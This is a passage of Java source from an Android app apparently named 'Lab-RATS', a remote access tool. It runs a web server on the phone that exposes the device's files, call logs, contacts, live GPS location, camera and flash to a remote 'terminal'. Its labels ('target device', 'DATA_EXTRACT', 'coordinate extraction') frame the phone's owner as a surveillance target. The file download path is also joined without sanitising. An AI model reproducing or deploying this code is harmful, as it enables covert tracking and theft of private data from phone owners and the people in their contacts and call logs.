                html.append("<div class=\"file-icon ").append(iconClass).append("\">").append(icon).append("</div>");
                html.append("<div class=\"file-info\">");
                html.append("<a class=\"file-name\" href=\"/files/").append(filePath).append("\">").append(fileName).append("</a>");
                
                html.append("<div class=\"file-meta\">");
                if (file.isDirectory()) {
                    File[] subFiles = file.listFiles();
                    int count = subFiles != null ? subFiles.length : 0;
                    html.append("<span style=\"color: #f39c12;\">DIRECTORY</span> &nbsp;|&nbsp; ").append(count).append(" OBJECTS");
                } else {
                    String ext = "";
                    int i = fileName.lastIndexOf('.');
                    if (i > 0) ext = fileName.substring(i+1).toUpperCase();
                    html.append("<span style=\"color: var(--neon-cyan);\">").append(ext.isEmpty() ? "FILE" : ext).append("</span> &nbsp;|&nbsp; ");
                    html.append(formatFileSize(file.length())).append(" &nbsp;|&nbsp; ");
                    html.append(new SimpleDateFormat("MMM dd, yyyy HH:mm", Locale.getDefault()).format(new Date(file.lastModified())));
                }
                html.append("</div></div>");

                if (file.isFile()) {
                    String lowerName = fileName.toLowerCase();
                    if (lowerName.endsWith(".txt") || lowerName.endsWith(".json") || lowerName.endsWith(".log") || 
                        lowerName.endsWith(".xml") || lowerName.endsWith(".html") || lowerName.endsWith(".js") || lowerName.endsWith(".css")) {
                        html.append("<a class=\"btn btn-small\" style=\"margin-right:8px; border-color:var(--neon-orange); color:var(--neon-orange); background:rgba(255,157,0,0.05);\" href=\"/files/edit/").append(filePath).append("\">EDIT</a>");
                    }
                    html.append("<a class=\"btn btn-small\" href=\"/download/").append(filePath)
                            .append("\">FETCH</a>");
                }

                html.append("</li>");
            }
            html.append("</ul>");
        } else {
            html.append(
                    "<div class=\"empty-state\"><div class=\"icon\">&#128237;</div><p>This folder is empty</p></div>");
        }

        html.append("</div>");
        html.append(HTML_FOOTER);

        return newFixedLengthResponse(Response.Status.OK, "text/html", html.toString());
    }

    private Response serveFileDownload(File file) {
        try {
            logActivity("DATA_EXTRACT: File fetched - " + file.getName());
            FileInputStream fis = new FileInputStream(file);
            String mimeType = getMimeType(file.getName());
            Response response = newFixedLengthResponse(Response.Status.OK, mimeType, fis, file.length());
            response.addHeader("Content-Disposition", "attachment; filename=\"" + file.getName() + "\"");
            return response;
        } catch (Exception e) {
            return serveError("Cannot read file: " + e.getMessage());
        }
    }

    private Response serveDownload(String uri) {
        String path = uri.substring(10);
        path = path.replace("%20", " ");
        File baseDir = Environment.getExternalStorageDirectory();
        File file = new File(baseDir, path);

        if (!file.exists() || !file.isFile()) {
            return serve404();
        }

        return serveFileDownload(file);
    }

    private Response serveCallLogs(Map<String, String> params) {
        StringBuilder html = new StringBuilder(HTML_HEADER);
        html.append("<div class=\"back-btn-container\">");
        html.append("<a href=\"/\" class=\"btn-back\">&#8592; Back to Terminal</a>");
        html.append("</div>");
        html.append("<div class=\"card\">");
        html.append("<h2 style=\"margin-bottom: 20px;\">Recent Call Logs</h2>");

        // Check permission first
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            if (context.checkSelfPermission(Manifest.permission.READ_CALL_LOG) != PackageManager.PERMISSION_GRANTED) {
                html.append("<div class=\"empty-state\"><div class=\"icon\">&#128274;</div>");
                html.append("<p>Call log permission not granted.</p>");
                html.append(
                        "<p style=\"margin-top: 10px; font-size: 0.9rem;\">Please grant the permission in the app settings.</p>");
                html.append("</div>");
                html.append("</div>");
                html.append(HTML_FOOTER);
                return newFixedLengthResponse(Response.Status.OK, "text/html", html.toString());
            }
        }

        // Pagination
        int page = 1;
        int limit = 50;
        try {
            if (params.containsKey("page")) {
                page = Integer.parseInt(params.get("page"));
                if (page < 1)
                    page = 1;
            }
        } catch (Exception e) {
            page = 1;
        }
        int offset = (page - 1) * limit;

        Cursor cursor = null;
        try {
            // Query for call logs - compatible with Android 13+
            String[] projection = new String[] {
                    CallLog.Calls._ID,
                    CallLog.Calls.NUMBER,
                    CallLog.Calls.CACHED_NAME,
                    CallLog.Calls.TYPE,
                    CallLog.Calls.DATE,
                    CallLog.Calls.DURATION
            };

            String sortOrder = CallLog.Calls.DATE + " DESC";

            cursor = context.getContentResolver().query(
                    CallLog.Calls.CONTENT_URI,
                    projection,
                    null,
                    null,
                    sortOrder);

            if (cursor != null && cursor.getCount() > 0) {
                int totalCount = cursor.getCount();
                int totalPages = (int) Math.ceil((double) totalCount / limit);

                html.append("<p style=\"color: #888; margin-bottom: 15px;\">Total: ").append(totalCount)
                        .append(" calls | Page ").append(page).append(" of ").append(totalPages).append("</p>");

                html.append("<div style=\"overflow-x: auto;\">");
                html.append("<table>");
                html.append("<thead><tr>");
                html.append("<th>Type</th><th>Contact</th><th>Number</th><th>Date</th><th>Duration</th>");
                html.append("</tr></thead><tbody>");

                int count = 0;
                int skipped = 0;

                while (cursor.moveToNext()) {
                    // Skip to offset
                    if (skipped < offset) {
                        skipped++;
                        continue;
                    }

                    // Limit results
                    if (count >= limit)
                        break;

                    int idIdx = cursor.getColumnIndex(CallLog.Calls._ID);
                    int numberIdx = cursor.getColumnIndex(CallLog.Calls.NUMBER);
                    int nameIdx = cursor.getColumnIndex(CallLog.Calls.CACHED_NAME);
                    int typeIdx = cursor.getColumnIndex(CallLog.Calls.TYPE);
                    int dateIdx = cursor.getColumnIndex(CallLog.Calls.DATE);
                    int durationIdx = cursor.getColumnIndex(CallLog.Calls.DURATION);

                    String number = numberIdx >= 0 ? cursor.getString(numberIdx) : "Unknown";
                    String name = nameIdx >= 0 ? cursor.getString(nameIdx) : null;
                    int type = typeIdx >= 0 ? cursor.getInt(typeIdx) : 0;
                    long date = dateIdx >= 0 ? cursor.getLong(dateIdx) : 0;
                    int duration = durationIdx >= 0 ? cursor.getInt(durationIdx) : 0;

                    String typeIcon, typeClass;
                    switch (type) {
                        case CallLog.Calls.INCOMING_TYPE:
                            typeIcon = "&#8595; In";
                            typeClass = "call-incoming";
                            break;
                        case CallLog.Calls.OUTGOING_TYPE:
                            typeIcon = "&#8593; Out";
                            typeClass = "call-outgoing";
                            break;
                        case CallLog.Calls.MISSED_TYPE:
                            typeIcon = "&#10006; Missed";
                            typeClass = "call-missed";
                            break;
                        case CallLog.Calls.REJECTED_TYPE:
                            typeIcon = "&#10006; Rejected";
                            typeClass = "call-missed";
                            break;
                        case CallLog.Calls.BLOCKED_TYPE:
                            typeIcon = "&#128683; Blocked";
                            typeClass = "call-missed";
                            break;
                        default:
                            typeIcon = "&#128222; Other";
                            typeClass = "";
                    }

                    html.append("<tr>");
                    html.append("<td class=\"").append(typeClass).append("\">").append(typeIcon).append("</td>");
                    html.append("<td>").append(name != null && !name.isEmpty() ? escapeHtml(name) : "-")
                            .append("</td>");
                    html.append("<td>").append(number != null ? escapeHtml(number) : "Unknown").append("</td>");
                    html.append("<td>").append(
                            new SimpleDateFormat("MMM dd, yyyy HH:mm", Locale.getDefault()).format(new Date(date)))
                            .append("</td>");
                    html.append("<td>").append(formatDuration(duration)).append("</td>");
                    html.append("</tr>");

                    count++;
                }

                html.append("</tbody></table>");
                html.append("</div>");

                // Pagination links
                if (totalPages > 1) {
                    html.append("<div class=\"pagination\" style=\"flex-direction: column; gap: 15px;\">");

                    html.append("<div style=\"display: flex; gap: 5px; justify-content: center; flex-wrap: wrap;\">");
                    if (page > 1) {
                        html.append("<a href=\"/calls?page=1\">First</a>");
                        html.append("<a href=\"/calls?page=").append(page - 1).append("\">&#8592; Prev</a>");
                    }

                    int startPage = Math.max(1, page - 2);
                    int endPage = Math.min(totalPages, page + 2);

                    for (int i = startPage; i <= endPage; i++) {
                        String active = (i == page) ? "class=\"active\"" : "";
                        html.append("<a ").append(active).append(" href=\"/calls?page=").append(i).append("\">").append(i).append("</a>");
                    }

                    if (page < totalPages) {
                        html.append("<a href=\"/calls?page=").append(page + 1).append("\">Next &#8594;</a>");
                        html.append("<a href=\"/calls?page=").append(totalPages).append("\">Last</a>");
                    }
                    html.append("</div>");

                    // Jump to page box
                    html.append("<form action=\"/calls\" method=\"get\" style=\"display: flex; gap: 10px; justify-content: center; align-items: center;\">");
                    html.append("<span style=\"font-size: 0.8rem; color: #888;\">Jump to:</span>");
                    html.append("<input type=\"number\" name=\"page\" min=\"1\" max=\"").append(totalPages).append("\" value=\"").append(page).append("\" style=\"width: 60px; background: rgba(0,0,0,0.5); border: 1px solid var(--neon-cyan); color: white; padding: 5px; border-radius: 4px; text-align: center;\">");
                    html.append("<button type=\"submit\" class=\"btn btn-small\">GO</button>");
                    html.append("</form>");

                    html.append("</div>");
                }
            } else {
                html.append(
                        "<div class=\"empty-state\"><div class=\"icon\">&#128222;</div><p>No call logs found</p></div>");
            }
        } catch (SecurityException e) {
            html.append("<div class=\"empty-state\"><div class=\"icon\">&#128274;</div>");
            html.append("<p>Permission denied.</p>");
            html.append("<p style=\"margin-top: 10px; font-size: 0.9rem;\">Error: ").append(escapeHtml(e.getMessage()))
                    .append("</p>");
            html.append("</div>");
        } catch (Exception e) {
            html.append("<div class=\"empty-state\"><div class=\"icon\">&#9888;</div>");
            html.append("<p>Error loading call logs</p>");
            html.append("<p style=\"margin-top: 10px; font-size: 0.9rem;\">").append(escapeHtml(e.getMessage()))
                    .append("</p>");
            html.append("</div>");
        } finally {
            if (cursor != null) {
                cursor.close();
            }
        }

        html.append("</div>");
        html.append(HTML_FOOTER);

        return newFixedLengthResponse(Response.Status.OK, "text/html", html.toString());
    }

    private Response serveContacts(Map<String, String> params) {
        StringBuilder html = new StringBuilder(HTML_HEADER);
        html.append("<div class=\"back-btn-container\">");
        html.append("<a href=\"/\" class=\"btn-back\">&#8592; Back to Terminal</a>");
        html.append("</div>");
        html.append("<div class=\"card\">");
        html.append("<h2 style=\"margin-bottom: 20px;\">Contacts</h2>");

        // Check permission first
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            if (context.checkSelfPermission(Manifest.permission.READ_CONTACTS) != PackageManager.PERMISSION_GRANTED) {
                html.append("<div class=\"empty-state\"><div class=\"icon\">&#128274;</div>");
                html.append("<p>Contacts permission not granted.</p>");
                html.append(
                        "<p style=\"margin-top: 10px; font-size: 0.9rem;\">Please grant the permission in the app settings.</p>");
                html.append("</div>");
                html.append("</div>");
                html.append(HTML_FOOTER);
                return newFixedLengthResponse(Response.Status.OK, "text/html", html.toString());
            }
        }

        // Pagination
        int page = 1;
        int limit = 50;
        try {
            if (params.containsKey("page")) {
                page = Integer.parseInt(params.get("page"));
                if (page < 1)
                    page = 1;
            }
        } catch (Exception e) {
            page = 1;
        }
        int offset = (page - 1) * limit;

        Cursor cursor = null;
        try {
            cursor = context.getContentResolver().query(
                    ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                    new String[] {
                            ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
                            ContactsContract.CommonDataKinds.Phone.NUMBER
                    },
                    null, null,
                    ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME + " ASC");

            if (cursor != null && cursor.getCount() > 0) {
                int totalCount = cursor.getCount();
                int totalPages = (int) Math.ceil((double) totalCount / limit);

                html.append("<p style=\"color: #888; margin-bottom: 15px;\">Total: ").append(totalCount)
                        .append(" contacts | Page ").append(page).append(" of ").append(totalPages).append("</p>");

                html.append("<div style=\"overflow-x: auto;\">");
                html.append("<table>");
                html.append("<thead><tr>");
                html.append("<th>Name</th><th>Phone Number</th>");
                html.append("</tr></thead><tbody>");

                int count = 0;
                int skipped = 0;

                while (cursor.moveToNext()) {
                    if (skipped < offset) {
                        skipped++;
                        continue;
                    }

                    if (count >= limit)
                        break;

                    String name = cursor.getString(0);
                    String number = cursor.getString(1);
                    String initial = name != null && !name.isEmpty() ? name.substring(0, 1).toUpperCase() : "?";

                    html.append("<tr>");
                    html.append("<td style=\"display: flex; align-items: center;\">");
                    html.append("<div class=\"contact-avatar\">").append(initial).append("</div>");
                    html.append("<span>").append(name != null ? escapeHtml(name) : "Unknown").append("</span>");
                    html.append("</td>");
                    html.append("<td>").append(number != null ? escapeHtml(number) : "N/A").append("</td>");
                    html.append("</tr>");

                    count++;
                }

                html.append("</tbody></table>");
                html.append("</div>");

                // Pagination links
                if (totalPages > 1) {
                    html.append("<div class=\"pagination\" style=\"flex-direction: column; gap: 15px;\">");

                    html.append("<div style=\"display: flex; gap: 5px; justify-content: center; flex-wrap: wrap;\">");
                    if (page > 1) {
                        html.append("<a href=\"/contacts?page=1\">First</a>");
                        html.append("<a href=\"/contacts?page=").append(page - 1).append("\">&#8592; Prev</a>");
                    }

                    int startPage = Math.max(1, page - 2);
                    int endPage = Math.min(totalPages, page + 2);

                    for (int i = startPage; i <= endPage; i++) {
                        String active = (i == page) ? "class=\"active\"" : "";
                        html.append("<a ").append(active).append(" href=\"/contacts?page=").append(i).append("\">").append(i).append("</a>");
                    }

                    if (page < totalPages) {
                        html.append("<a href=\"/contacts?page=").append(page + 1).append("\">Next &#8594;</a>");
                        html.append("<a href=\"/contacts?page=").append(totalPages).append("\">Last</a>");
                    }
                    html.append("</div>");

                    // Jump to page box
                    html.append("<form action=\"/contacts\" method=\"get\" style=\"display: flex; gap: 10px; justify-content: center; align-items: center;\">");
                    html.append("<span style=\"font-size: 0.8rem; color: #888;\">Jump to:</span>");
                    html.append("<input type=\"number\" name=\"page\" min=\"1\" max=\"").append(totalPages).append("\" value=\"").append(page).append("\" style=\"width: 60px; background: rgba(0,0,0,0.5); border: 1px solid var(--neon-cyan); color: white; padding: 5px; border-radius: 4px; text-align: center;\">");
                    html.append("<button type=\"submit\" class=\"btn btn-small\">GO</button>");
                    html.append("</form>");

                    html.append("</div>");
                }
            } else {
                html.append(
                        "<div class=\"empty-state\"><div class=\"icon\">&#128101;</div><p>No contacts found</p></div>");
            }
        } catch (SecurityException e) {
            html.append("<div class=\"empty-state\"><div class=\"icon\">&#128274;</div>");
            html.append("<p>Permission denied.</p>");
            html.append("<p style=\"margin-top: 10px; font-size: 0.9rem;\">Error: ").append(escapeHtml(e.getMessage()))
                    .append("</p>");
            html.append("</div>");
        } catch (Exception e) {
            html.append("<div class=\"empty-state\"><div class=\"icon\">&#9888;</div>");
            html.append("<p>Error loading contacts</p>");
            html.append("<p style=\"margin-top: 10px; font-size: 0.9rem;\">").append(escapeHtml(e.getMessage()))
                    .append("</p>");
            html.append("</div>");
        } finally {
            if (cursor != null) {
                cursor.close();
            }
        }

        html.append("</div>");
        html.append(HTML_FOOTER);

        return newFixedLengthResponse(Response.Status.OK, "text/html", html.toString());
    }

    private Response serve404() {
        String html = HTML_HEADER +
                "<div class=\"card\">" +
                "<div class=\"empty-state\">" +
                "<div class=\"icon\">&#128269;</div>" +
                "<h2 style=\"margin-bottom: 10px;\">Page Not Found</h2>" +
                "<p>The requested page does not exist.</p>" +
                "<a href=\"/\" style=\"display: inline-block; margin-top: 20px; padding: 12px 24px; background: linear-gradient(135deg, #e94560, #ff6b6b); border-radius: 10px; color: white; text-decoration: none;\">Go Home</a>"
                +
                "</div>" +
                "</div>" +
                HTML_FOOTER;
        return newFixedLengthResponse(Response.Status.NOT_FOUND, "text/html", html);
    }

    private Response serveError(String message) {
        String html = HTML_HEADER +
                "<div class=\"card\">" +
                "<div class=\"empty-state\">" +
                "<div class=\"icon\">&#9888;</div>" +
                "<h2 style=\"margin-bottom: 10px;\">Error</h2>" +
                "<p>" + escapeHtml(message) + "</p>" +
                "</div>" +
                "</div>" +
                HTML_FOOTER;
        return newFixedLengthResponse(Response.Status.INTERNAL_ERROR, "text/html", html);
    }

    private Response triggerFlash() {
        try {
            // Check if CameraService is using the camera
            if (CameraService.isCurrentlyStreaming() || CameraService.isCurrentlyRecording()) {
                return serveError("Flash unavailable while camera is in use (streaming/recording).");
            }

            CameraManager camManager = (CameraManager) context.getSystemService(Context.CAMERA_SERVICE);
            String backCameraId = null;
            
            for (String id : camManager.getCameraIdList()) {
                try {
                    android.hardware.camera2.CameraCharacteristics characteristics = camManager.getCameraCharacteristics(id);
                    Integer facing = characteristics.get(android.hardware.camera2.CameraCharacteristics.LENS_FACING);
                    if (facing != null && facing == android.hardware.camera2.CameraCharacteristics.LENS_FACING_BACK) {
                        backCameraId = id;
                        break;
                    }
                } catch (Exception e) {
                    Log.e("Lab-RATS", "Error checking camera " + id, e);
                }
            }

            if (backCameraId == null && camManager.getCameraIdList().length > 0) {
                backCameraId = camManager.getCameraIdList()[0];
            }

            if (backCameraId != null) {
                final String finalId = backCameraId;
                new Thread(() -> {
                    try {
                        CameraManager manager = (CameraManager) context.getSystemService(Context.CAMERA_SERVICE);
                        for (int i = 0; i < 3; i++) {
                            try {
                                manager.setTorchMode(finalId, true);
                                Thread.sleep(300);
                                manager.setTorchMode(finalId, false);
                                Thread.sleep(300);
                            } catch (android.hardware.camera2.CameraAccessException e) {
                                // If camera is in use (e.g. streaming), torch mode might fail
                                Log.e("Lab-RATS", "Flash access error: " + e.getMessage());
                                break;
                            }
                        }
                    } catch (Exception e) {
                        Log.e("Lab-RATS", "Flash error: " + e.getMessage());
                    }
                }).start();
                return newFixedLengthResponse(Response.Status.OK, "application/json", "{\"success\": true, \"message\": \"Flash command dispatched\"}");
            } else {
                return serveError("No camera with flash found.");
            }
        } catch (Exception e) {
            return serveError("Flash error: " + e.getMessage());
        }
    }

    private Response serveGpsPage() {
        StringBuilder html = new StringBuilder(HTML_HEADER);
        html.append("<div class=\"back-btn-container\">");
        html.append("<a href=\"/\" class=\"btn-back\">&#8592; Back to Terminal</a>");
        html.append("</div>");
        html.append("<div class=\"card\">");
        html.append("<h2 style=\"margin-bottom: 20px;\">&#128205; GPS Satellite Uplink</h2>");
        html.append("<p style=\"color: #888; margin-bottom: 25px;\">Active tracking and coordinate extraction for the target device.</p>");
        
        // Map Container
        html.append("<div id=\"map-container\" style=\"width: 100%; height: 450px; background: #000; border: 1px solid var(--neon-cyan); border-radius: 8px; margin-bottom: 25px; overflow: hidden; position: relative;\">");
        html.append("<div id=\"map-overlay\" style=\"position: absolute; top: 0; left: 0; width: 100%; height: 100%; display: flex; align-items: center; justify-content: center; background: rgba(0,0,0,0.8); z-index: 5;\">");
        html.append("<div style=\"text-align: center;\"><div style=\"font-size: 2rem; margin-bottom: 10px;\">&#128225;</div><div style=\"color: var(--neon-cyan); letter-spacing: 2px;\">AWAITING_SATELLITE_FIX</div></div>");
        html.append("</div>");
        html.append("<iframe id=\"map-frame\" width=\"100%\" height=\"100%\" frameborder=\"0\" style=\"border:0; filter: invert(90%) hue-rotate(180deg); display: none;\" allowfullscreen></iframe>");
        html.append("</div>");

        html.append("<div style=\"display: flex; gap: 15px; justify-content: center; margin-bottom: 30px;\">");
        html.append("<button onclick=\"locateDevice()\" class=\"btn\" style=\"padding: 15px 30px;\">&#128205; PING_LOCATION</button>");
        html.append("<button id=\"ext-map-btn\" onclick=\"openExternalMap()\" class=\"btn\" style=\"padding: 15px 30px; border-color: var(--neon-cyan); color: var(--neon-cyan); display: none;\">&#128640; OPEN_EXTERNAL</button>");
        html.append("</div>");
        
        html.append("<div class=\"info-item\" style=\"margin-bottom: 25px;\">");
        html.append("<div class=\"info-label\">COORD_SYSTEM</div>");
        html.append("<div id=\"coord-display\" class=\"info-value\">WAITING_FOR_DATA...</div>");
        html.append("</div>");

        html.append("<div style=\"padding: 20px; background: rgba(0,0,0,0.3); border: 1px solid rgba(0, 242, 255, 0.1);\">");
        html.append("<h3 style=\"font-size: 0.8rem; opacity: 0.7;\">LOCATION_STREAM</h3>");
        html.append("<div id=\"gps-log\" style=\"color: var(--terminal-green); font-size: 0.75rem; font-family: 'JetBrains Mono', monospace; line-height: 1.5;\">");
        html.append("<div>[SYSTEM] Tracker standby...</div>");
        html.append("</div></div>");

        html.append("<script>");
        html.append("var currentLat = 0; var currentLon = 0;");
        html.append("function addLog(msg) {");
        html.append("  const log = document.getElementById('gps-log');");
        html.append("  const div = document.createElement('div');");
        html.append("  div.textContent = '[' + new Date().toLocaleTimeString() + '] ' + msg;");
        html.append("  log.insertBefore(div, log.firstChild);");
        html.append("}");
        html.append("function locateDevice() {");
        html.append("  addLog('[REQUEST] Pinging satellites...');");
        html.append("  fetch('/gps/locate?json=true').then(r => r.json()).then(data => {");
        html.append("    if (data.success) {");
        html.append("      currentLat = data.lat; currentLon = data.lon;");
        html.append("      document.getElementById('coord-display').innerHTML = 'LAT: ' + data.lat + ' | LON: ' + data.lon;");
        html.append("      addLog('[SUCCESS] Fix acquired: ' + data.lat + ', ' + data.lon);");
        html.append("      const frame = document.getElementById('map-frame');");
        html.append("      const overlay = document.getElementById('map-overlay');");
        html.append("      const extBtn = document.getElementById('ext-map-btn');");
        // Using OpenStreetMap export embed for cleaner iframe support without API keys
        html.append("      frame.src = 'https://www.openstreetmap.org/export/embed.html?bbox=' + (data.lon-0.01) + ',' + (data.lat-0.01) + ',' + (data.lon+0.01) + ',' + (data.lat+0.01) + '&layer=mapnik&marker=' + data.lat + ',' + data.lon;");
        html.append("      frame.style.display = 'block';");
        html.append("      overlay.style.display = 'none';");
        html.append("      extBtn.style.display = 'inline-block';");
        html.append("    } else {");
        html.append("      addLog('[ERROR] ' + data.message);");
        html.append("      alert(data.message);");
        html.append("    }");
        html.append("  }).catch(err => {");
        html.append("    addLog('[FATAL] Network error during triangulation');");
        html.append("  });");
        html.append("}");
        html.append("function openExternalMap() {");
        html.append("  window.open('https://www.google.com/maps/search/?api=1&query=' + currentLat + ',' + currentLon, '_blank');");
        html.append("}");
        html.append("</script>");
        
        html.append("</div>");
        html.append(HTML_FOOTER);
        return newFixedLengthResponse(Response.Status.OK, "text/html", html.toString());
    }

    private Response serveGpsLocate(Map<String, String> params) {
        boolean hasFineLocation = ContextCompat.checkSelfPermission(context, Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED;
        boolean hasCoarseLocation = ContextCompat.checkSelfPermission(context, Manifest.permission.ACCESS_COARSE_LOCATION) == PackageManager.PERMISSION_GRANTED;

        if (!hasFineLocation && !hasCoarseLocation) {
            return params.containsKey("json") ?
                    newFixedLengthResponse(Response.Status.OK, "application/json", "{\"success\": false, \"message\": \"Location permission not granted. Please ensure location permissions are allowed in app settings.\"}") :
                    serveError("Location permission not granted. Please ensure location permissions are allowed in app settings.");
        }

        try {
            LocationManager locationManager = (LocationManager) context.getSystemService(Context.LOCATION_SERVICE);
            Location location = null;

            // Try to get fresh location if on Android 11+
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                // This is a blocking call for a short time, but we are in a NanoHTTPD worker thread
                final java.util.concurrent.CompletableFuture<Location> future = new java.util.concurrent.CompletableFuture<>();
                if (hasFineLocation) {
                    locationManager.getCurrentLocation(
                            LocationManager.GPS_PROVIDER,
                            null,
                            ContextCompat.getMainExecutor(context),
                            loc -> future.complete(loc));
                } else {
                    locationManager.getCurrentLocation(
                            LocationManager.NETWORK_PROVIDER,
                            null,
                            ContextCompat.getMainExecutor(context),
                            loc -> future.complete(loc));
                }
                
                try {
                    location = future.get(5, java.util.concurrent.TimeUnit.SECONDS);
                } catch (Exception e) {
                    Log.e("Lab-RATS", "Error getting current location: " + e.getMessage());
                }
            }

            // Fallback to LastKnownLocation if getCurrentLocation failed or not available
            if (location == null) {
                // Try GPS first
                if (hasFineLocation && locationManager.isProviderEnabled(LocationManager.GPS_PROVIDER)) {
                    location = locationManager.getLastKnownLocation(LocationManager.GPS_PROVIDER);
                }

                // Try Network as fallback
                if (location == null && locationManager.isProviderEnabled(LocationManager.NETWORK_PROVIDER)) {
                    location = locationManager.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
                }

                // Try Passive as last resort
                if (location == null) {
                    location = locationManager.getLastKnownLocation(LocationManager.PASSIVE_PROVIDER);
                }
            }

            if (location != null) {
                double lat = location.getLatitude();
                double lon = location.getLongitude();

                if (params.containsKey("json")) {
                    String json = String.format(Locale.US, "{\"success\": true, \"lat\": %f, \"lon\": %f, \"provider\": \"%s\", \"accuracy\": %f, \"time\": %d}",
                            lat, lon, location.getProvider(), location.getAccuracy(), location.getTime());
                    return newFixedLengthResponse(Response.Status.OK, "application/json", json);
                }

                String mapsUrl = "https://www.google.com/maps/search/?api=1&query=" + lat + "," + lon;
                Response response = newFixedLengthResponse(Response.Status.REDIRECT, "text/html", "");
                response.addHeader("Location", mapsUrl);
                return response;
            } else {
                String errorMsg = "Could not retrieve location. Ensure GPS/Location is enabled on the device and has a clear view of the sky.";
                if (!locationManager.isProviderEnabled(LocationManager.GPS_PROVIDER) && !locationManager.isProviderEnabled(LocationManager.NETWORK_PROVIDER)) {
                    errorMsg = "Location services are DISABLED on the device. Please enable them.";
                }
                
                return params.containsKey("json") ?
                        newFixedLengthResponse(Response.Status.OK, "application/json", "{\"success\": false, \"message\": \"" + errorMsg + "\"}") :
                        serveError(errorMsg);
            }
        } catch (SecurityException e) {
            return params.containsKey("json") ?
                    newFixedLengthResponse(Response.Status.OK, "application/json", "{\"success\": false, \"message\": \"Permission denied: " + e.getMessage() + "\"}") :
                    serveError("Location permission denied: " + e.getMessage());
        } catch (Exception e) {
            return params.containsKey("json") ?
                    newFixedLengthResponse(Response.Status.OK, "application/json", "{\"success\": false, \"message\": \"Internal error: " + e.getMessage() + "\"}") :
                    serveError("Location error: " + e.getMessage());
        }
    }

    private String escapeHtml(String text) {
        if (text == null)
            return "";
        return text.replace("&", "&amp;")
                .replace("<", "&lt;")
                .replace(">", "&gt;")
                .replace("\"", "&quot;")
                .replace("'", "&#39;");
    }

    private String getFileIcon(File file) {
        if (file.isDirectory())
            return "&#128193;";
        String name = file.getName().toLowerCase();
        if (name.matches(".*\\.(jpg|jpeg|png|gif|bmp|webp)$"))
            return "&#128444;";
        if (name.matches(".*\\.(mp4|mkv|avi|mov|wmv|flv|webm)$"))
            return "&#127916;";
        if (name.matches(".*\\.(mp3|wav|aac|flac|ogg|m4a)$"))
            return "&#127925;";
        if (name.matches(".*\\.(pdf)$"))
            return "&#128196;";
        if (name.matches(".*\\.(doc|docx|txt|rtf)$"))
            return "&#128221;";
        if (name.matches(".*\\.(xls|xlsx|csv)$"))
            return "&#128202;";
        if (name.matches(".*\\.(zip|rar|7z|tar|gz)$"))
            return "&#128230;";
        if (name.matches(".*\\.(apk)$"))
            return "&#128241;";
        return "&#128196;";
    }

    private String getFileIconClass(File file) {
        if (file.isDirectory())
            return "folder-icon";
        String name = file.getName().toLowerCase();
        if (name.matches(".*\\.(jpg|jpeg|png|gif|bmp|webp)$"))
            return "file-icon-image";
        if (name.matches(".*\\.(mp4|mkv|avi|mov|wmv|flv|webm)$"))
            return "file-icon-video";
        if (name.matches(".*\\.(mp3|wav|aac|flac|ogg|m4a)$"))
            return "file-icon-audio";
        if (name.matches(".*\\.(pdf|doc|docx|txt|rtf|xls|xlsx|csv)$"))
            return "file-icon-doc";
        return "file-icon-default";
    }

    private String getMimeType(String filename) {
        String name = filename.toLowerCase();
        if (name.endsWith(".jpg") || name.endsWith(".jpeg"))
            return "image/jpeg";
        if (name.endsWith(".png"))
            return "image/png";
        if (name.endsWith(".gif"))
            return "image/gif";
        if (name.endsWith(".mp4"))
            return "video/mp4";
        if (name.endsWith(".mp3"))
            return "audio/mpeg";
        if (name.endsWith(".pdf"))
            return "application/pdf";
        if (name.endsWith(".zip"))
            return "application/zip";
        if (name.endsWith(".apk"))
            return "application/vnd.android.package-archive";
        return "application/octet-stream";
    }

    private String formatFileSize(long size) {
        if (size < 1024)
            return size + " B";
        if (size < 1024 * 1024)
            return String.format("%.1f KB", size / 1024.0);
        if (size < 1024 * 1024 * 1024)
            return String.format("%.1f MB", size / (1024.0 * 1024));
        return String.format("%.1f GB", size / (1024.0 * 1024 * 1024));
    }

    private String formatDuration(int seconds) {
        if (seconds < 60)
            return seconds + "s";
        if (seconds < 3600)
            return String.format("%dm %ds", seconds / 60, seconds % 60);
        return String.format("%dh %dm", seconds / 3600, (seconds % 3600) / 60);
    }

    // ============ Camera Methods ============

    private Response serveCameraPage() {
        StringBuilder html = new StringBuilder(HTML_HEADER);
        html.append("<div class=\"back-btn-container\">");
        html.append("<a href=\"/\" class=\"btn-back\">&#8592; Back to Terminal</a>");
        html.append("</div>");
        html.append("<div class=\"card\">");
        html.append("<h2 style=\"display:flex; align-items:center; gap:15px; margin-bottom:20px;\">")
            .append("<span style=\"color:var(--neon-cyan);\">&#128247;</span> OPTICS_TERMINAL")
            .append("<span id=\"night-mode-status\" style=\"margin-left:auto; font-size:0.7rem; color:").append(CameraService.isNightModeEnabled() ? "var(--neon-green)" : "var(--neon-red)").append("; font-family:monospace;\">NIGHT_MODE: ").append(CameraService.isNightModeEnabled() ? "ACTIVE" : "OFF").append("</span>")
            .append("</h2>");

        html.append("<div style=\"padding:15px; margin-bottom:20px; display:flex; justify-content:center; align-items:center; border:1px solid rgba(255,255,0,0.1); border-radius:12px; background:rgba(255,255,0,0.02);\">")
            .append("<button onclick=\"toggleNightMode()\" id=\"night-btn\" class=\"btn\" style=\"padding:10px 20px; border-color:var(--neon-yellow); color:var(--neon-yellow); background:rgba(255,255,0,0.05); font-size:0.8rem;\">")
            .append("&#127769; TOGGLE NIGHT VISION")
            .append("</button>")
            .append("<script>")
            .append("function toggleNightMode() {")
            .append("  fetch('/camera/night-mode').then(r => r.json()).then(data => {")
            .append("    const status = document.getElementById('night-mode-status');")
            .append("    if(data.nightMode) {")
            .append("      status.innerText = 'NIGHT_MODE: ACTIVE'; status.style.color = 'var(--neon-green)';")
            .append("    } else {")
            .append("      status.innerText = 'NIGHT_MODE: OFF'; status.style.color = 'var(--neon-red)';")
            .append("    }")
            .append("  });")
            .append("}")
            .append("</script>")
            .append("</div>");

        // Check permission
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            if (context.checkSelfPermission(android.Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
